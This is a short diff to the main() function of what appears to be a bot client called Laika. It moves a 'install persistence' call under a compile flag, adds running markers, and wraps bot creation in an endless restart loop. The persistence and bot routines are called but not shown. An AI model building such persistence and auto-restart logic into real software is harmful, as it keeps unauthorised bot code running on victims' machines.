@@ -10,10 +10,11 @@
 int main(int argv, char *argc[]) {
     struct sLaika_bot *bot;
 
+#ifdef LAIKA_PERSISTENCE
+    laikaB_markRunning();
+
     /* install persistence */
     laikaB_tryPersist();
-
-#ifdef LAIKA_PERSISTENCE
     do {
 #endif
         bot = laikaB_newBot();
@@ -33,6 +34,8 @@ int main(int argv, char *argc[]) {
 #ifdef LAIKA_PERSISTENCE
         sleep(5);
     } while (1);
+
+    laikaB_unmarkRunning();
 #endif
 
     return 0;
